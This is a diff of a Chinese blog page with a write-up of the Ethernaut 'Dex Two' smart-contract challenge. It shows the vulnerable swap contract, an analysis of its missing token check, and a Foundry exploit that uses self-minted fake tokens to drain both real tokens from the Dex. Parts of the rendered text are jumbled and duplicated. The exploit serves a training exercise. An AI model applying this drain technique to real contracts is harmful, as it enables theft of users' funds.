@@ -35,7 +35,7 @@
   <!-- feed -->
   <!-- 页面元数据 -->
   <title>Dex Two - 笔友🍉の知识库</title>
-  <meta name="keywords" content="靶场,Solidity,null">
+  <meta name="keywords" content="Solidity,靶场,null">
   <meta desc name="description" content="Self-Discipline - 笔友🍉 - 笔友🍉の知识库">
   
 <meta property="og:type" content="article">
@@ -48,8 +48,8 @@
 <meta property="article:published_time" content="2023-03-11T04:15:10.000Z">
 <meta property="article:modified_time" content="2023-03-11T04:15:10.000Z">
 <meta property="article:author" content="笔友🍉">
-<meta property="article:tag" content="靶场">
 <meta property="article:tag" content="Solidity">
+<meta property="article:tag" content="靶场">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -1794,7 +1794,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1690522141791),
+    lastupdate: new Date(1692682587051),
     sidebar: {
       for_page: ["blogger","category","tagcloud","webinfo","qrcode"],
       for_post: ["toc","blogger","qrcode"],
@@ -2995,13 +2995,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fa-solid fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：939 字</p>
+      <p>字数：913 字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fa-solid fa-bell fa-fw" aria-hidden="true"></i>
-      <p>时长：5 分钟</p>
+      <p>时长：4 分钟</p>
     </a>
   </div>
 
@@ -3055,115 +3055,41 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </li>
 <li><p>题目代码</p>
 </li>
-<li><pre><code class="solidity">// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;;
-import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;;
-import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;;
 
-contract DexTwo is Ownable &#123;
-  address public token1;
-  address public token2;
-  constructor() &#123;&#125;
 
-  function setTokens(address _token1, address _token2) public onlyOwner &#123;
-    token1 = _token1;
-    token2 = _token2;
-  &#125;
+<h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><h3 id="tips：参考博客"><a href="#tips：参考博客" class="headerlink" title="tips：参考博客"></a>tips：<a target="_blank" rel="noopener" href="https://stermi.xyz/blog/ethernaut-challenge-22-solution-dex-two">参考博客</a></h3><ul>
+<li><p>2.1 分析合约：</p>
+<ul>
+<li><code>swap</code> 函数 ：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function swap(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount</span><br><span class="line">) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint256 swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;
-    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
-  &#125;
-  
-  function swap(address from, address to, uint amount) public &#123;
-    require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);
-    uint swapAmount = getSwapAmount(from, to, amount);
-    IERC20(from).transferFrom(msg.sender, address(this), amount);
-    IERC20(to).approve(address(this), swapAmount);
-    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
-  &#125; 
-
-  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;
-    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
-  &#125;
-
-  function approve(address spender, uint amount) public &#123;
-    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
-    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
-  &#125;
-
-  function balanceOf(address token, address account) public view returns (uint)&#123;
-    return IERC20(token).balanceOf(account);
-  &#125;
-&#125;
-
-contract SwappableTokenTwo is ERC20 &#123;
-  address private _dex;
-  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;
-        _mint(msg.sender, initialSupply);
-        _dex = dexInstance;
-  &#125;
-
-  function approve(address owner, address spender, uint256 amount) public &#123;
-    require(owner != _dex, &quot;InvalidApprover&quot;);
-    super._approve(owner, spender, amount);
-  &#125;
-&#125;
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 2. 分析</span><br><span class="line"></span><br><span class="line">### tips：[参考博客](https://stermi.xyz/blog/ethernaut-challenge-22-solution-dex-two)</span><br><span class="line"></span><br><span class="line">- 2.1 分析合约：</span><br><span class="line"></span><br><span class="line">  -  `swap` 函数 ：</span><br><span class="line"></span><br><span class="line">  - ```solidity</span><br><span class="line">    function swap(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) public &#123;</span><br><span class="line">        require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;);</span><br><span class="line">        uint256 swapAmount = getSwapAmount(from, to, amount);</span><br><span class="line">        IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-- 当前`swap`函数不检查`from`，实际上是合约处理的`to`白名单`token1`和代币。`token2``DexTwo`
-
-  这是该函数先前版本中存在的检查：`require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);`
-
-  这是什么意思？这允许攻击者调用该`swap`函数，出售**任意** 令牌以从 Dex`from`获取“真实”令牌。`to`这意味着我们可以创建一个`UselessERC20`完全由我们拥有和管理的全新代币（我们可以铸造、销毁、做任何我们想做的事）并获得一些`token1`或`token2`免费获得。
-
-  我们可以耗尽`DexTwo`合同`token1`并`token2`各打一次电话吗？为此，我们需要找到正确的`fakeToken`卖出数量以取回 100 `token1`。
-
-- 做数学计算，看一下getSwapAmount函数
-
-- &gt; ```unknown
-  &gt; 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken
-  &gt; 100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken
-  &gt; <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> - 我们有两个可以控制的变量。我们肯定知道它`DexBalanceOfFakeToken`必须**&gt; 1**否则交易将因为被**0 除**而恢复。如果我们发送 1`FakeToken`给`DexTwo`我们</span><br><span class="line"></span><br><span class="line"> - &gt; ```unknown</span><br><span class="line">100 token1 = amountOfFakeTokenToSell * 100 / 1</span><br><span class="line">1 token1 = amountOfFakeTokenToSell</span><br></pre></td></tr></table></figure>
-
-- 因此，通过`1 FakeToken1`向`DexTwo`合约发送给它一些流动性，我们可以交换 100`FakeToken`以取回 100 `token1`。之后，我们只需要对**另一个**实例重复相同的操作，并从 Dex 中`FakeToken2`排出所有的。`token2`
+<ul>
+<li><p>当前<code>swap</code>函数不检查<code>from</code>，实际上是合约处理的<code>to</code>白名单<code>token1</code>和代币。<code>token2``DexTwo</code></p>
+<p>这是该函数先前版本中存在的检查：<code>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</code></p>
+<p>这是什么意思？这允许攻击者调用该<code>swap</code>函数，出售<strong>任意</strong> 令牌以从 Dex<code>from</code>获取“真实”令牌。<code>to</code>这意味着我们可以创建一个<code>UselessERC20</code>完全由我们拥有和管理的全新代币（我们可以铸造、销毁、做任何我们想做的事）并获得一些<code>token1</code>或<code>token2</code>免费获得。</p>
+<p>我们可以耗尽<code>DexTwo</code>合同<code>token1</code>并<code>token2</code>各打一次电话吗？为此，我们需要找到正确的<code>fakeToken</code>卖出数量以取回 100 <code>token1</code>。</p>
+</li>
+<li><p>做数学计算，看一下getSwapAmount函数</p>
+</li>
+<li><blockquote>
+<pre><code class="unknown">100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken
+100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> - 我们有两个可以控制的变量。我们肯定知道它`DexBalanceOfFakeToken`必须**&gt; 1**否则交易将因为被**0 除**而恢复。如果我们发送 1`FakeToken`给`DexTwo`我们</span><br><span class="line"></span><br><span class="line"> - &gt; ```unknown</span><br><span class="line">100 token1 = amountOfFakeTokenToSell * 100 / 1</span><br><span class="line">1 token1 = amountOfFakeTokenToSell</span><br></pre></td></tr></table></figure>
 </code></pre>
+</blockquote>
+</li>
+<li><p>因此，通过<code>1 FakeToken1</code>向<code>DexTwo</code>合约发送给它一些流动性，我们可以交换 100<code>FakeToken</code>以取回 100 <code>token1</code>。之后，我们只需要对<strong>另一个</strong>实例重复相同的操作，并从 Dex 中<code>FakeToken2</code>排出所有的。<code>token2</code></p>
 </li>
 <li><h4 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h4></li>
-<li><pre><code class="solidity">function exploitLevel() internal override &#123;
-    vm.startPrank(player, player);
-
-    // Deploy a fake token based on the SwappableTokenTwo contract
-    // Mint 10k tokens and send them to the player (msg.sender)
-    SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000);
-    SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000);
-
-
-    // Approve the dex to manage all of our token
-    token1.approve(address(level), 2**256 - 1);
-    token2.approve(address(level), 2**256 - 1);
-    fakeToken1.approve(address(level), 2**256 - 1);
-    fakeToken2.approve(address(level), 2**256 - 1);
-
-    // send 1 fake token to the DexTwo to have at least 1 of liquidity
-    ERC20(fakeToken1).transfer(address(level), 1);
-    ERC20(fakeToken2).transfer(address(level), 1);
-
-    // Swap 100 fakeToken1 to get 100 token1
-    level.swap(address(fakeToken1), address(token1), 1);
-    // Swap 100 fakeToken2 to get 100 token2
-    level.swap(address(fakeToken2), address(token2), 1);
-
-    // Assert that we have drained the Dex contract
-    assertEq(token1.balanceOf(address(level)) == 0 &amp;&amp; token2.balanceOf(address(level)) == 0, true);
-
-    vm.stopPrank();
-&#125;
-</code></pre>
-</li>
-<li></li>
 </ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function exploitLevel() internal override &#123;</span><br><span class="line">    vm.startPrank(player, player);</span><br><span class="line"></span><br><span class="line">    // Deploy a fake token based on the SwappableTokenTwo contract</span><br><span class="line">    // Mint 10k tokens and send them to the player (msg.sender)</span><br><span class="line">    SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000);</span><br><span class="line">    SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Approve the dex to manage all of our token</span><br><span class="line">    token1.approve(address(level), 2**256 - 1);</span><br><span class="line">    token2.approve(address(level), 2**256 - 1);</span><br><span class="line">    fakeToken1.approve(address(level), 2**256 - 1);</span><br><span class="line">    fakeToken2.approve(address(level), 2**256 - 1);</span><br><span class="line"></span><br><span class="line">    // send 1 fake token to the DexTwo to have at least 1 of liquidity</span><br><span class="line">    ERC20(fakeToken1).transfer(address(level), 1);</span><br><span class="line">    ERC20(fakeToken2).transfer(address(level), 1);</span><br><span class="line"></span><br><span class="line">    // Swap 100 fakeToken1 to get 100 token1</span><br><span class="line">    level.swap(address(fakeToken1), address(token1), 1);</span><br><span class="line">    // Swap 100 fakeToken2 to get 100 token2</span><br><span class="line">    level.swap(address(fakeToken2), address(token2), 1);</span><br><span class="line"></span><br><span class="line">    // Assert that we have drained the Dex contract</span><br><span class="line">    assertEq(token1.balanceOf(address(level)) == 0 &amp;&amp; token2.balanceOf(address(level)) == 0, true);</span><br><span class="line"></span><br><span class="line">    vm.stopPrank();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <h2 id="3-解题"><a href="#3-解题" class="headerlink" title="3. 解题"></a>3. 解题</h2>
   </div>
   
@@ -3235,8 +3161,8 @@ contract SwappableTokenTwo is ERC20 &#123;
         
           
   
-  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div>
-  <span hidden itemprop="keywords">靶场 Solidity</span>
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Solidity/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>Solidity</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="nofollow"><i class="fa-solid fa-bookmark fa-fw" aria-hidden="true"></i><p>靶场</p></a></div>
+  <span hidden itemprop="keywords">Solidity 靶场</span>
 
 
         
@@ -3264,11 +3190,10 @@ contract SwappableTokenTwo is ERC20 &#123;
   
     <div class="prev-next">
       
-        <a class='prev' href='/2023/03/12/Smart%20contracts/ethernaut/Puzzle%20Wallet/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>Puzzle Wallet</p>
-          <p class='content'>Puzzle Wallet（不会）1. 题目要求
-1.1 Nowadays, paying for DeFi operations is impossible, fact.
-A group of...</p>
+        <a class='prev' href='/2023/03/13/Smart%20contracts/ethernaut/DoubleEntryPoint/'>
+          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>DoubleEntryPoint</p>
+          <p class='content'>DoubleEntryPoint1. 题目要求
+1.1 此级别具有CryptoVault特殊功能，sweepToken功能。这是用于检索卡在合约中的代币的常用函数。操作CryptoVault使用...</p>
         </a>
       
       
@@ -3440,7 +3365,7 @@ A group of...</p>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="toc-text">攻击合约</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E8%A6%81%E6%B1%82"><span class="toc-text">1. 题目要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90"><span class="toc-text">2. 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tips%EF%BC%9A%E5%8F%82%E8%80%83%E5%8D%9A%E5%AE%A2"><span class="toc-text">tips：参考博客</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6"><span class="toc-text">攻击合约</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E8%A7%A3%E9%A2%98"><span class="toc-text">3. 解题</span></a></li></ol>
     </div>
   </section>
 
@@ -4488,7 +4413,7 @@ window.matchMedia('(prefers-color-scheme: light)').addListener(darkModelListener
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/03/11/Smart contracts/ethernaut/Dex Two/","name":"Dex Two"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Dex Two","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/03/11/Smart%20contracts/ethernaut/Dex%20Two/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/03/11/Smart%20contracts/ethernaut/Dex%20Two/","wordCount":0,"datePublished":"2023-03-11T04:15:10.000Z","dateModified":"2023-03-11T04:15:10.000Z","articleSection":"Smart contracts","keywords":"靶场,Solidity","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","sameAs":["https://github.com/volantis-x"],"description":"Self-Discipline"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https://biyouqiuqiu.com/","name":"笔友🍉の知识库"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/","name":"Smart contracts"}},{"@type":"ListItem","position":2,"item":{"@id":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/","name":"ethernaut"}},{"@type":"ListItem","position":3,"item":{"@id":"https://biyouqiuqiu.com/2023/03/11/Smart contracts/ethernaut/Dex Two/","name":"Dex Two"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","keywords":null,"description":"Self-Discipline","author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/","description":"Self-Discipline"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","url":"https://biyouqiuqiu.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"https://biyouqiuqiu.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"Dex Two","description":"Self-Discipline","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https://biyouqiuqiu.com/2023/03/11/Smart%20contracts/ethernaut/Dex%20Two/"},"author":{"@type":"Person","name":"笔友🍉","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"https://biyouqiuqiu.com/"},"publisher":{"@type":"Organization","name":"笔友🍉の知识库","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"https://biyouqiuqiu.com/2023/03/11/Smart%20contracts/ethernaut/Dex%20Two/","wordCount":0,"datePublished":"2023-03-11T04:15:10.000Z","dateModified":"2023-03-11T04:15:10.000Z","articleSection":"Smart contracts","keywords":"Solidity,靶场","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
